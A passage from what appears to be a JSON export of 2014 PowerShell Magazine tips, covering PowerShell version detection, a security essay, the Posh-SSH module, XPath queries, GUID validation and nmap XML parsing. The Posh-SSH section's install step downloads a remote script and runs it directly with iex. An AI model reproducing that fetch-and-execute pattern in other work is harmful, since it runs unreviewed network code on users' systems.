systems. So, without knowing what OS the remote system is running, this is a little tricky and lengthy process.\nWorking through this, I found a simple method to detect if a remote system has PowerShell 4.0 or later. This method uses CIM cmdlets to find if the root\\microsoft\\windows\\desiredstateconfiguration namespace exists on the remote system. DSC is a feature introduced in PowerShell 4.0. If this namespace exists on the remote system, we can safely conclude that the system has PowerShell 4.0 installed.\nHere is the code in action:\nFunction Test-DscNamespace ($ComputerName = $env:COMPUTERNAME) { if (Get-CimInstance -ComputerName $ComputerName -Namespace root\\Microsoft\\Windows -ClassName __NAMESPACE -Filter \u0026quot;name='DesiredStateConfiguration'\u0026quot; -ErrorAction SilentlyContinue) { $true } else { $false } } $Servers = \u0026quot;Demo-Ad\u0026quot;,\u0026quot;WC7-1\u0026quot;,\u0026quot;WS8R2-1\u0026quot;,\u0026quot;WS8R2-2\u0026quot;,\u0026quot;WSR2-3-WMF50\u0026quot;,\u0026quot;WSR2-1\u0026quot; foreach ($server in $Servers) { New-Object -TypeName PSObject -Property @{ PSComputerName = $Server IsPowerShell4 = Test-DscNamespace -ComputerName $Server } } ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/07/pstip-finding-if-a-system-has-powershell-4-0-or-later/","tags":["Tips and Tricks"],"title":"#PSTip Finding if a system has PowerShell 4.0 or later"},{"categories":["Security","InfoSec"],"contents":"If you surveyed the landscape of computer security a decade ago, you would find a world completely different than the one we live in today.\nIn the early 2000s, our industry was still reeling from the impact of Code Red, Nimda, and SQL Slammer. While some operating systems had network firewalls, few enabled them by default. It was a world where server misconfigurations and accidentally exposing services to the internet reigned supreme.\nIn that world, network security forms the battle ground. Slap an Enterprise Grade™ firewall on your network edge, add a demilitarized zone (DMZ), and call it a day. Attackers back then focused on full frontal assault: port scanning, service compromise, buffer overflows, denial of service, and more.\nThat world still exists, and by no means can we consider that battle won. Our industry has matured, however, and we’ve made significant strides in protecting ourselves from this type of attack. As our network security has improved and those pickings have become slim, attackers have moved on to more creative attacks on the most critical components of the network: those that manage it. With just a little bit of social engineering or phishing, most networks are quick to fall.\nWhen it comes to social engineering or phishing, the words simply don’t effectively illustrate the danger. If you haven’t seen the brutal efficiency of these attacks before, I invite you to watch Kevin Mitnick and Dave Kennedy demolish a corporate fortress with a single phone call:\n  Four minutes after their target first picks up the phone, a couple of random dudes from Las Vegas are able to evade hundreds of thousands of dollars of security equipment and run arbitrary code on the company’s corporate network. In front of an audience of a couple hundred hackers, to boot.\nNow, once an attacker tricks a user to run arbitrary code on their machine, it’s not that user’s machine anymore. And worse: whatever that code decides to do has the same power as if the user were to do it by hand. It doesn’t matter if they’re tricked into running a Java applet, malicious PDF document, batch file, or PowerShell script – the permissions and capabilities of that compromised user account are now completely open to abuse.\nIf you’re uncomfortable with what a compromised administrator could do to your cloud or corporate network, it would be well worth your time applying the principles of Just Enough Administration (JEA). Jeffrey Snover gave an excellent deep dive on the topic at TechEd North America 2014: “A Windows PowerShell Toolkit to Secure a Post-Snowden World”.\n In this new world of “assume breach”, PowerShell plays a few interesting roles.\nDo you remember the exhilaration you felt the first time you replaced a hundred-line VBScript tool with a PowerShell one-liner? While PowerShell can’t do anything you couldn’t already do with a custom-written C++ or VBScript application – it’s just so much more fun! This same realization is slowly growing within the offensive and defensive security community. When attackers are already running arbitrary code on a network, they’re beginning to realize that writing a registry dumper in PowerShell is infinitely easier than doing it in assembly language or C++. Or that querying Active Directory with the AD cmdlets is way more fun than programming the LDAP queries by hand. While they could accomplish the task through other (more complicated) means, job satisfaction is just as important to an attacker as it is to you and I.\nThis uptick of PowerShell usage in the security community isn’t restricted to attackers, of course. As you’ll see this week, PowerShell forms an incredible platform for security analytics and network defense. Whether you’re reverse engineering malware, troubleshooting a suspicious system, or enforcing strict administrative boundaries on your network, PowerShell is truly making it easier than ever to adapt to an ever-changing world.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/07/security-in-a-changing-world/","tags":["Security","InfoSec"],"title":"Security in a Changing World"},{"categories":["Tips and Tricks"],"contents":"A previous article in PowerShell Magazine describes how to find keyboard shortcuts in the PowerShell ISE. In this tip we will look at how we can find a key we do not know. The Go To Match keyboard shortcut in the ISE is Ctrl + Oem6. In my case I’m using a Dell laptop, and I have no clue where the Oem6 keyboard key is.\nAs a workaround, we can assign Go To Match a custom key combination in a PowerShell ISE Add-on menu item:\n$psISE.CurrentPowerShellTab.AddOnsMenu.Submenus.Add('GoToMatch',{$psise.CurrentFile.Editor.GoToMatch()},'Alt+X')  But if we really want to locate a keyboard key, we can use the Console.ReadKey method and simply start pressing buttons:\nwhile($true){[Console]::ReadKey($true)}  In my case, Oem6 turned out to be the Norwegian letter å. To verify I tried Ctrl + å in the PowerShell ISE to find a matching bracket, which did work as expected.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/03/pstip-finding-keyboard-keys/","tags":["Tips and Tricks"],"title":"#PSTip Finding keyboard keys"},{"categories":["Module Spotlight","Posh-SSH"],"contents":"What Posh-SSH is a PowerShell 3.0 or newer module for automating tasks against system using the SSH protocol. The module supports only a subset of the capabilities that the different SSH RFCs http://en.wikipedia.org/wiki/Secure_Shell define but it allows for:\n Establish SSH and SFTP sessions using credentials or OpenSSH keys. Connecting through SOCKS and HTTP proxies for both SSH and SFTP sessions. Execution of commands in a remote host using SSH Exec command. Uploading and downloading of files using SCP and SFTP.  From the SSH standards it supports the following:\n Supports DIFFIE-HELLMAN-GROUP-EXCHANGE-SHA256, DIFFIE-HELLMAN-GROUP-EXCHANGE-SHA1, DIFFIE-HELLMAN-GROUP14-SHA1 and DIFFIE-HELLMAN-GROUP1-SHA1 key exchange methods. Supports 3DES-cbc, AES128-CBC, AES192-CBC, AES256-CBC, AES128-CTR, AES192-CTR, AES256-CTR, BlowFish-CBC, CAST128-CBC, ARCFour and TwoFish encryptions. Supports HMAC-MD5, HMAC-SHA1, HMAC-RIPEMD160, HMAC-SHA2-256, HMAC-SHA2-256-96, HMAC-MD5-96 and HMAC-SHA1-96 hashing algorithms. Supports public key, password, and keyboard-interactive authentication methods Supports RSA and DSA private key Supports DES-EDE3-CBC, DES-EDE3-CFB, DES-CBC, AES-128-CBC, AES-192-CBC and AES-256-CBC algorithms for private key encryption Supports SOCKS4, SOCKS5 and HTTP proxy  Why I wrote the Posh-SSH module for automating testing of code I wrote in Ruby, Python and other languages in a lab environments where the code runs in a variety of systems than ranged from BSD Linux, OS X and Windows systems where I needed to only execute a series of commands and get the output. I knew I could do this with Python- or Ruby-based great SSH libraries but I took it as a challenge to do it in PowerShell. I found the SSHT.NET library in CodePlex http://sshnet.codeplex.com/ and just started implementing the code in PowerShell. Some of the tasks required the interaction with .NET events and I decided to manage those in C# since examples where already present. It was an interesting experience in my journey of learning how to write a PowerShell module in C#. Posh-SSH was born out of my own technical needs and the opportunity to learn new things.\nInstall The module is hosted in GitHub at https://github.com/darkoperator/Posh-SSH; all source code for the cmdlets and for the module is available there and it is licensed under the BSD 3-Clause License. The module requires PowerShell 3.0 and .NET Framework 4.0. The quickest way to install the module is by running:\niex (New-Object Net.WebClient).DownloadString(\u0026quot;https://gist.github.com/darkoperator/6152630/raw/c67de4f7cd780ba367cccbc2593f38d18ce6df89/instposhsshdev\u0026quot;) This will download the latest version of Posh-SSH and install it in the user’s profile. Once it finishes downloading and copying the module to the right place, it will list the commands available:\nConnecting The way the module works is by establishing sessions to each of the hosts we want to run against. By allowing multiple sessions at once it allows me to control and automate tasks against more than one hosts and not have to re-login to each one. The command to create a new session is New-SSHSession\nPS\u0026gt; help New-SSHSession NAME New-SSHSession SYNOPSIS Creates an SSH Session against a SSH Server SYNTAX New-SSHSession [-ComputerName] \u0026lt;String[]\u0026gt; [-Credential] \u0026lt;PSCredential\u0026gt; [-Port \u0026lt;Int32\u0026gt;] [-ProxyServer \u0026lt;String\u0026gt;] [-ProxyPort \u0026lt;Int32\u0026gt;] [-ProxyCredential \u0026lt;PSCredential\u0026gt;] [-ProxyType \u0026lt;String\u0026gt;] [-ConnectionTimeOut \u0026lt;Int32\u0026gt;] [-KeepAliveInterval \u0026amp;lt;Int32\u0026amp;gt;] [-AcceptKey [\u0026lt;Boolean\u0026gt;]] [-PipelineVariable \u0026lt;String\u0026gt;] [\u0026lt;CommonParameters\u0026gt;] New-SSHSession [-ComputerName] \u0026lt;String[]\u0026gt; [-Credential] \u0026lt;PSCredential\u0026gt; [-Port \u0026lt;Int32\u0026gt;] [-ProxyServer \u0026lt;String\u0026gt;] [-ProxyPort \u0026lt;Int32\u0026gt;] [-ProxyCredential \u0026lt;PSCredential\u0026gt;] [-ProxyType \u0026lt;String\u0026gt;] [-KeyFile \u0026lt;String\u0026gt;] [-ConnectionTimeOut \u0026lt;Int32\u0026gt;] [-KeepAliveInterval \u0026lt;Int32\u0026gt;] [-AcceptKey [\u0026lt;Boolean\u0026gt;]] [-PipelineVariable \u0026lt;String\u0026gt;] [\u0026lt;CommonParameters\u0026gt;] DESCRIPTION Creates an SSH Session against a remote server. The command supports creating connection thru a Proxy and allows for authentication to the server using username and password. If a key file is specified the command will use the password in the credentials parameter as the paraphrase of the key. RELATED LINKS REMARKS To see the examples, type: \u0026quot;get-help New-SSHSession -examples\u0026quot;. For more information, type: \u0026quot;get-help New-SSHSession -detailed\u0026quot;. For technical information, type: \u0026quot;get-help New-SSHSession -full\u0026quot;.  When we establish a new session for the first time it will check SSH server certificate fingerprint and IP address combination to those saved in HKEY_CURRENT_USER\\Software\\PoshSSH registry key; if there is a mismatch it will generate an error that the fingerprint did not match and if it is not present it will show the fingerprint and ask if you want to trust or not the host before connecting:\nPS\u0026gt; New-SSHSession -ComputerName \u0026quot;192.168.1.191\u0026quot; -Credential (Get-Credential carlos) Server SSH Fingerprint Do you want to trust the fingerprint 62:ef:96:b6:f8:a9:6c:7c:34:29:e6:d6:ba:59:ad:2f [] Y [] N [?] Help (default is \u0026quot;N\u0026quot;): Y Index Host Connected ----- ---- --------- 0 192.168.1.191 True We can see all the hosts we trust using the Get-SSHTrustedHost command and one can remove hosts from the trusts list using Remove-SSHTrustedHost:\nPS\u0026gt; Get-SSHTrustedHost | fl SSHHost : 192.168.1.191 Fingerprint : 62:ef:96:b6:f8:a9:6c:7c:34:29:e6:d6:ba:59:ad:2f When the session is created, we can look at the session using the Get-SSHSession command\nPS\u0026gt; Get-SSHSession | fl Connected : True Index : 0 Host : 192.168.1.191 Session : Renci.SshNet.SshClient Each session has the Index property that can be used with other commands or the object that is returned.\nTo disconnect from the hosts we use the Remove-SSHSession\nPS\u0026gt; Remove-SSHSession -Index 0 -Verbose VERBOSE: 0 VERBOSE: Removing session 0 True VERBOSE: Session 0 Removed Executing Command We can execute commands against a session or sessions using the Invoke-SSHCommand command. When a command is executed an object representing the results of the execution is returned. When executed it instantiates on the system a new instance of the default shell configured on the system, executes the command and returns an object and the exit status of the last command executed.\nPS\u0026gt; Invoke-SSHCommand -Index 0 -Command \u0026quot;uname -a\u0026quot; Host : 192.168.1.191 Output : Linux testdebian7 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux ExitStatus : 0 In the case of Linux/Unix systems when the command string is given to the shell, the instance is closed so it will retain the state because the shell instance is closed after each execution.\nPS\u0026gt; Invoke-SSHCommand -Index 0 -Command \u0026quot;pwd\u0026quot; Host : 192.168.1.191 Output : /home/carlos ExitStatus : 0 PS\u0026gt; Invoke-SSHCommand -Index 0 -Command \u0026quot;cd /\u0026quot; Host : 192.168.1.191 Output : ExitStatus : 0 PS\u0026gt; Invoke-SSHCommand -Index 0 -Command \u0026quot;pwd\u0026quot; Host : 192.168.1.191 Output : /home/carlos ExitStatus : 0 But in the case of Linux or Unix we can chain command with the shell command terminator and have the shell run them.\nPS C:\\\u0026gt; Invoke-SSHCommand -Index 0 -Command \u0026quot;uname -a; cd /; pwd; ls -l\u0026quot; Host : 192.168.1.191 Output : Linux testdebian7 3.2.0-4-amd64 #1 SMP Debian 3.2.51-1 x86_64 GNU/Linux / total 88 drwxr-xr-x 2 root root 4096 Dec 17 2013 bin drwxr-xr-x 3 root root 4096 Dec 17 2013 boot drwxr-xr-x 13 root root 3200 Jun 28 11:16 dev drwxr-xr-x 133 root root 12288 Jun 28 11:16 etc drwxr-xr-x 3 root root 4096 Dec 17 2013 home lrwxrwxrwx 1 root root 30 Dec 17 2013 initrd.img -\u0026gt; /boot/initrd.img-3.2.0-4-amd64 drwxr-xr-x 15 root root 4096 Dec 17 2013 lib drwxr-xr-x 2 root root 4096 Dec 17 2013 lib64 drwx------ 2 root root 16384 Dec 17 2013 lost+found drwxr-xr-x 4 root root 4096 Oct 13 2013 media drwxr-xr-x 2 root root 4096 Sep 22 2013 mnt drwxr-xr-x 2 root root 4096 Oct 13 2013 opt dr-xr-xr-x 105 root root 0 Jun 28 11:15 proc drwx------ 3 root root 4096 Dec 17 2013 root drwxr-xr-x 19 root root 880 Jun 28 11:16 run drwxr-xr-x 2 root root 4096 Dec 17 2013 sbin drwxr-xr-x 2 root root 4096 Jun 10 2012 selinux drwxr-xr-x 2 root root 4096 Oct 13 2013 srv drwxr-xr-x 13 root root 0 Jun 28 11:15 sys drwxrwxrwt 6 root root 4096 Jun 28 14:17 tmp drwxr-xr-x 10 root root 4096 Dec 17 2013 usr drwxr-xr-x 12 root root 4096 Dec 17 2013 var lrwxrwxrwx 1 root root 26 Dec 17 2013 vmlinuz -\u0026gt; boot/vmlinuz-3.2.0-4-amd64 ExitStatus : 0 This will work with Unix, Linux and even Windows systems running SSH.\nOne special case is with Cisco equipment where after execution of the command the Cisco equipment terminated the connection. In this case we can create a console using the SSH session object. When we create the console, it reruns a console stream object to which we can write commands we want to execute, terminating them with e new line and then read the output that was generated by reading the stream.\nPS\u0026gt; $session = Get-SSHSession -Index 1 PS\u0026gt; $stream = $session.Session.CreateShellStream(\u0026quot;dumb\u0026quot;, 0, 0, 0, 0, 1000) PS\u0026gt; $stream.Write(\u0026quot;show ver`n\u0026quot;) PS\u0026gt; $stream.Read() TSGAP01#show ver Cisco IOS Software, C1240 Software (C1240-K9W7-M), Version 12.3(8)JA, RELEASE SOFTWARE (fc2) Technical Support: http://www.cisco.com/techsupport Copyright (c) 1986-2006 by Cisco Systems, Inc. Compiled Mon 27-Feb-06 09:17 by ssearch ROM: Bootstrap program is C1240 boot loader BOOTLDR: C1240 Boot Loader (C1240-BOOT-M) Version 12.3(7)JA1, RELEASE SOFTWARE (fc1) TSGAP01 uptime is 2 minutes System returned to ROM by power-on System image file is \u0026quot;flash:/c1240-k9w7-mx.123-8.JA/c1240-k9w7-mx.123-8.JA\u0026quot; This product contains cryptographic features and is subject to United States and local country laws governing import, export, transfer and use. Delivery of Cisco cryptographic products does not imply third-party authority to import, export, distribute or use encryption. Importers, exporters, distributors and users are responsible for compliance with U.S. and local country laws. By using this product you agree to comply with applicable laws and regulations. If you are unable to comply with U.S. and local laws, return this product immediately. --More-- PS\u0026gt; $stream.Write(\u0026quot;`n\u0026quot;) PS\u0026gt; $stream.Read() TSGAP01#  Uploading and Downloading Files with SCP The module also provides SCP commands for uploading and downloading files. SCP works by establishing a connection and copying or downloading the file specified depending on the action selected.\nFor uploading a file we use the Set-SCPFile cmdlet. We need to specify a server, credentials, a local file that we want to upload, and the full path and name of the full path of the destination file.\nPS C:\\\u0026gt; Set-SCPFile -LocalFile .\\Downloads\\VMware-PowerCLI-5.5.0-1671586.exe -RemoteFile \"/tmp/powercliinstaller.exe\" -ComputerName 192.168.10.3 -Credential (Get-Credential root)  The cmdlet provides progress information about the uploaded bytes.\nTo download a file the process is similar, but we use the Get-SCPFile cmdlet.\nPS C:\\\u0026gt; Get-SCPFile -LocalFile .\\Downloads\\VMware-PowerCLI.exe -RemoteFile \"/tmp/powercliinstaller.exe\" -ComputerName 192.168.10.3 -Credential (Get-Credential root)  We can also do the same with folder using Get-SCPFolder and Set-SCPFolder. The cmdlet will upload all files recursively.\nUsing SFTP The module also provides SFTP support. The SFTP commands also work with sessions. To create a SFTP session we use the New-SFTPSession cmdlet. It uses the same list of trusted hosts as the one for SSH sessions.\nPS\u0026gt; New-SFTPSession -ComputerName 192.168.10.3 -Credential (Get-Credential root) -Verbose | fl VERBOSE: Using Username and Password authentication for connection. VERBOSE: Connecting to 192.168.10.3 with user root Connected : True Index : 0 Host : 192.168.10.3 Session : Renci.SshNet.SftpClient Just like with SSH commands, SFTP commands use the index of the session or the session object itself to specify a session. Use the Get-SFTPSession command to get all SFTP sessions or a specified one.\nPS\u0026gt; Get-SFTPSession | fl Connected : True Index : 0 Host : 192.168.10.3 Session : Renci.SshNet.SftpClient One big difference between SSH and SFTP sessions is that the SFTP session is just like FTP. A stateful one where we can change directory paths and the session remains on that location. We can get our current location on the system using the Get-SFTPCurrentDirectory command and we can change location using Set-SFTPDirectoryPath cmdlet.\nPS\u0026gt; Get-SFTPCurrentDirectory -Index 0 /root PS\u0026gt; Set-SFTPDirectoryPath -Index 0 -Path /usr/bin PS\u0026gt; Get-SFTPCurrentDirectory -Index 0 /usr/bin We can get directory listings using the Get-SFTPDirectoryList command–the command will return a collection of objects referring to each of the files and directories in the given path.\nPS\u0026gt; Get-SFTPDirectoryList -Index 0 -Path /tmp FullName : /tmp/vmware-config2 LastAccessTime : 12/28/2013 8:54:40 AM LastWriteTime : 12/28/2013 8:54:40 AM Length : 4096 UserId : 0 FullName : /tmp/vmware-fonts0 LastAccessTime : 2/8/2013 7:50:24 PM LastWriteTime : 2/8/2013 7:50:24 PM Length : 4096 UserId : 0 FullName : /tmp/vmware-root LastAccessTime : 6/28/2014 3:00:52 PM LastWriteTime : 6/28/2014 3:00:52 PM Length : 4096 UserId : 0 FullName : /tmp/vmware-config0 LastAccessTime : 2/8/2013 7:50:00 PM LastWriteTime : 2/8/2013 7:50:00 PM Length : 4096 UserId : 0 FullName : /tmp/poshssh LastAccessTime : 6/28/2014 7:57:30 PM LastWriteTime : 6/28/2014 7:58:38 PM Length : 4096 UserId : 0 FullName : /tmp/vmware-fonts1 LastAccessTime : 4/26/2013 2:23:16 PM LastWriteTime : 4/26/2013 2:23:16 PM Length : 4096 UserId : 0 FullName : /tmp/vmware-tools-distrib LastAccessTime : 12/28/2013 8:36:20 AM LastWriteTime : 8/17/2013 1:51:12 PM Length : 4096 UserId : 0 FullName : /tmp/vmware-fonts2 LastAccessTime : 12/28/2013 8:55:01 AM LastWriteTime : 12/28/2013 8:55:01 AM Length : 4096 UserId : 0 FullName : /tmp/. LastAccessTime : 6/28/2014 9:42:56 PM LastWriteTime : 6/28/2014 9:39:44 PM Length : 4096 UserId : 0 FullName : /tmp/.ICE-unix LastAccessTime : 6/28/2014 3:00:50 PM LastWriteTime : 6/28/2014 3:00:50 PM Length : 4096 UserId : 0 FullName : /tmp/vmware-config1 LastAccessTime : 4/26/2013 2:22:52 PM LastWriteTime : 4/26/2013 2:22:52 PM Length : 4096 UserId : 0 FullName : /tmp/.. LastAccessTime : 6/28/2014 3:00:51 PM LastWriteTime : 6/28/2014 3:00:50 PM Length : 4096 UserId : 0 PS\u0026gt; Get-SFTPDirectoryList -Index 0 -Path /tmp | gm TypeName: Renci.SshNet.Sftp.SftpFile Name MemberType Definition ---- ---------- ---------- Delete Method void Delete() Equals Method bool Equals(System.Object obj) GetHashCode Method int GetHashCode() GetType Method type GetType() MoveTo Method void MoveTo(string destFileName) SetPermissions Method void SetPermissions(int16 mode) ToString Method string ToString() UpdateStatus Method void UpdateStatus() Attributes Property Renci.SshNet.Sftp.SftpFileAttributes Attributes {get;set;} Extensions Property System.Collections.Generic.IDictionary[string,string] Extensions {get;set;} FullName Property string FullName {get;set;} GroupCanExecute Property bool GroupCanExecute {get;set;} GroupCanRead Property bool GroupCanRead {get;set;} GroupCanWrite Property bool GroupCanWrite {get;set;} GroupId Property int GroupId {get;set;} IsBlockDevice Property bool IsBlockDevice {get;} IsCharacterDevice Property bool IsCharacterDevice {get;} IsDirectory Property bool IsDirectory {get;} IsNamedPipe Property bool IsNamedPipe {get;} IsRegularFile Property bool IsRegularFile {get;} IsSocket Property bool IsSocket {get;} IsSymbolicLink Property bool IsSymbolicLink {get;} LastAccessTime Property datetime LastAccessTime {get;set;} LastAccessTimeUtc Property datetime LastAccessTimeUtc {get;set;} LastWriteTime Property datetime LastWriteTime {get;set;} LastWriteTimeUtc Property datetime LastWriteTimeUtc {get;set;} Length Property long Length {get;} Name Property string Name {get;set;} OthersCanExecute Property bool OthersCanExecute {get;set;} OthersCanRead Property bool OthersCanRead {get;set;} OthersCanWrite Property bool OthersCanWrite {get;set;} OwnerCanExecute Property bool OwnerCanExecute {get;set;} OwnerCanRead Property bool OwnerCanRead {get;set;} OwnerCanWrite Property bool OwnerCanWrite {get;set;} UserId Property int UserId {get;set;} When working with files we can move, delete, upload, and download a specified files on a SFTP:\n Get-SFTPFile – Download a specified file from a remote SFTP session. Move-SFTPFile – Moves a specified file in a remote hosts through SFTP (Can be used to rename a file) Remove-SFTPFile – Deletes a specified file in a remote hosts through SFTP. Set-SFTPFile – Uploads a specified file to a given path using SFTP.  We can also create and delete directories on a target system:\n New-SFTPDirectory – Creates a directory in a remote hosts through SFTP. Remove-SFTPDirectory – Deletes a specified directory in a remote hosts through SFTP.  The Posh-SSH module should cover most of the basic needs. Each of the sessions include the session object that provides additional methods and properties. Most commands also return objects with additional methods and properties not shown by default that can be leveraged by an advanced user. I hope you find the module useful and if you come up with a new command or a bug fix do not hesitate to contribute.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/03/posh-ssh-open-source-ssh-powershell-module/","tags":["Modules","Posh-SSH"],"title":"Posh-SSH: Open Source SSH PowerShell Module"},{"categories":["XML","Tips and Tricks"],"contents":"When we analyze XML documents with XPath we may need information about number of certain items. For example, we can have an XHTML document with several tables and we can easily check which tables contain rows with ‘class’ attribute:\n$Common = @{ Path = 'SomeTables.xhtml' Namespace = @{ d = 'http://www.w3.org/1999/xhtml' } } Select-Xml -XPath '//d:table[d:tr[@class]]' @Common | ForEach-Object { $_.Node } | Format-Table -AutoSize id colgroup tr -- -------- -- withZebra colgroup {tr, tr, tr, tr...} withSmallZebra colgroup {tr, tr, tr} Note: You can find the input SomeTables.xhtml file here.\nWe nested one query within the other so that result will be table that contain rows with ‘class’ attribute defined. Now let’s try to get information about numbers–we may want to list only tables that have more than one row defined with ‘class’ attribute and for that we will use count() function:\nSelect-Xml -XPath '//d:table[count(d:tr[@class]) \u0026gt; 1]' @Common | ForEach-Object { $_.Node } | Format-Table -AutoSize id colgroup tr -- -------- -- withZebra colgroup {tr, tr, tr, tr...} And last but not least: we may use count() function few times in one query and compare the results, e.g. to get all tables where number of rows without ‘class’ attribute is higher than number of rows with that attribute:\nSelect-Xml -XPath '//d:table[count(d:tr[@class]) \u0026lt; count(d:tr[not(@class)])]' @Common | ForEach-Object { $_.Node } | Format-Table -AutoSize id colgroup tr -- -------- -- withoutZebra colgroup {tr, tr, tr, tr...} withSmallZebra colgroup {tr, tr, tr} ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/02/pstip-using-xpath-in-powershell-part-6/","tags":["XML","Tips and Tricks"],"title":"#PSTip Using XPath in PowerShell, Part 6"},{"categories":["XML","Tips and Tricks"],"contents":"XPath has one big disadvantage–it’s case sensitive. Unlike regular expressions, there is no way to “turn it off”. But there is a way around it. To make part of the query case insensitive we have to use translate() function. This function takes three arguments: string that will be modified, string that lists “originals”, and finally string that contains “replacements”. If there is more characters in the second string, then any extra character will be removed. For example, if we want any node element with attribute Name equal to ‘first’ (case-insensitive):\n$caseInsensitive = @' //node[ translate(@Name, \u0026quot;FIRST\u0026quot;, \u0026quot;first\u0026quot;) = 'first' ] '@ Select-Xml -XPath $caseInsensitive -Path .\\Test.xml | ForEach-Object { $_.Node.Name } First Note: You can find the code and input files here.\nBut that’s not the only situation when translate() function may come in handy. Because character than we translate to can be the same for each character replaced, we can write queries that behave almost like regular expressions. Good example would be a query to get all headings in XHTML document. Regular expression that matches node names for headings is ‘^h[1-6]$’. To get the same in XPath we would need to translate any number between 1 and 6 to the same character (e.g. ‘#’) and test if result is ‘h#’:\n$almostRegex = @' //*[ translate(name(), '123456', '######') = 'h#' ] '@ Select-Xml -XPath $almostRegex -Path .\\TestPage.xhtml | Select-Object Node Node ---- h1 h1 h2 h3 h6 h1 h1 ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/07/01/pstip-using-xpath-in-powershell-part-5/","tags":["XML","Tips and Tricks"],"title":"#PSTip Using XPath in PowerShell, Part 5"},{"categories":["XML","Tips and Tricks"],"contents":"Filtering using XPath is not limited to queries that make sure that existing value is equal to value that we are interested in. If the data within XML is numeric, we can use typical mathematical comparison operators:\nSelect-Xml -Path .\\Test.xml -XPath \u0026quot;//subNode[@Number \u0026gt; 1]\u0026quot; | ForEach-Object { $_.Node } Number ------ 2 Note: You can find the code and input file here.\nIt gets even more interesting once we start using functions available in XPath. First of all: contains() function. This is the function that we can use to do “wildcard” filters. Unlike PowerShell –contains operator this function works on strings. The first argument is used as a base and the second one as a substring that we want to find. For example, if we are interested in any XHTML element with id containing string “test”:\nSelect-Xml -Path .\\TestPage.xhtml -XPath \u0026quot;//*[contains(@id,'test')]\u0026quot; | ForEach-Object { $_.Node.id } testing othertest There are also two other functions useful in XPath filters. First can be used if we want to make sure that node name contains certain substring: name(). It may also happen, that we will need to check value of a given node: that will require use of text() function. We can combine the two to get all nodes with name containing ‘Password’ or with value containing ‘contoso’:\n$xpath = @' //*[ contains( name(), 'Password' ) or contains( text(), 'contoso' ) ] '@ Select-Xml -Path .\\ValueAndName.xml -XPath $xpath | Format-Table -AutoSize Node, @{ Name = 'Value' Expression = { $_.Node.InnerXml } } Node Value ---- ----- localPassword P@ssw0rd domainName contoso.com domainPassword P@$$word Finally: we can reverse any query using not() function to return only nodes that do not meet our criteria:\nSelect-Xml -Path .\\Test.xml -XPath \u0026quot;//subNode[not(@Number \u0026gt; 1)]\u0026quot; | ForEach-Object { $_.Node } Number ------ 1 This way we can sometimes get away with simpler filter that would normally give us all nodes we are not interested in, and reverse it to get the one we really need.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/30/pstip-using-xpath-in-powershell-part-4/","tags":["XML","Tips and Tricks"],"title":"#PSTip Using XPath in PowerShell, Part 4"},{"categories":["Tips and Tricks"],"contents":"Most of you probably know how to create a Globally Unique Identifier (GUID) with the following code:\n[System.Guid]::NewGuid()  But, let’s say, I have a function that has a GUID parameter. To validate the given GUID as an input, I’d use a regular expression with the ValidatePattern attribute.\nFunction Test-Foo { [CmdletBinding()] Param( [Parameter(Mandatory,ValueFromPipeline)] [ValidatePattern('(\\{|\\()?[A-Za-z0-9]{4}([A-Za-z0-9]{4}\\-?){4}[A-Za-z0-9]{12}(\\}|\\()?')] [string[]]$GUID ) Begin{} Process{ $_ } End{} }  The regular expression works great but doesn’t fully cover all the existing GUID formats. The ValidateScript attribute combined with the Parse method of the System.Guid object will help improve the validation.\nLet’s see this in action:\nFunction Test-Bar { [CmdletBinding()] Param( [Parameter(Mandatory,ValueFromPipeline)] [ValidateScript({ try { [System.Guid]::Parse($_) | Out-Null $true } catch { $false } })] [string[]]$GUID ) Begin{} Process{ $_ } End{} }  I’ll first create an array of 5 random GUIDs with different formats. The surrounding parenthesis display the content while assigning the output to a variable.\n($ar = \u0026quot;N\u0026quot;,\u0026quot;D\u0026quot;,\u0026quot;B\u0026quot;,\u0026quot;P\u0026quot;,\u0026quot;X\u0026quot; | ForEach { [System.Guid]::NewGuid().ToString($_) }) Let’s pass this array of 5 valid GUIDs to the first function that uses the regular expression:\nThe error above is expected as the regular expression doesn’t cover the 5th format. There is a second issue with the regular expression–it would report an invalid GUID that mixes 2 or 3 different formats as valid.\nThe Test-Foo function validates the above GUID although it isn’t valid.\nNow, let’s try the second function that uses the validation script and parse method:\nNo error, all GUIDs are valid. The validation script method fixes the second issue as well:\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2014/06/27/pstip-how-to-properly-validate-guid-parameter/","tags":["Tips and Tricks"],"title":"#PSTip How to properly validate GUID parameter"},{"categories":["Tips and Tricks","XML"],"contents":"Filtering data with XPath works very well even if we need more complex filters that require information from different levels in the XML document. Perfect example of such document is the result of nmap stored in the XML format:\nnmap.exe 192.168.200.0/24 -oX testLocal.xml  Note: You can find the code and input file here.\nIf we want to retrieve all IPv4 addresses from the hosts that are currently up we can ask for addresses (using //host/address path) and filter them on the information both on current level (to make sure we get correct address type) and value of attribute on node that has the same parent as node we want to retrieve (‘state’ on ‘status’ node):\n$addressUp = @' //host/address[ @addrtype = 'ipv4' and ../status/@state = 'up' ] '@ $nodeList = Select-Xml -Path .\\testLocal.xml -XPath $addressUp | ForEach-Object { $_.Node } $ldapPort = @' /host/ports/port[ @portid = '389' and state/@state = 'open' ] '@ foreach ($node in $nodeList) { $noteproperties = [ordered]@{ Address = $node.addr HostName = $node.ParentNode.hostnames.hostname.name } $partialXml = [XML]('\u0026lt;host\u0026gt;{0}\u0026lt;/host\u0026gt;' -f $node.ParentNode.InnerXml) Select-Xml -Xml $partialXml -XPath $ldapPort | Select-Object -ExpandProperty Node | Add-Member -NotePropertyMembers $noteproperties -PassThru } Address : 192.168.200.1 HostName : DC protocol : tcp portid : 389 state : state service : service Because ‘Node’ property will not contain markup for opening/closing node, we need to add it to get valid XML. Results are not very surprising–it’s not uncommon for domain controllers to have port 389 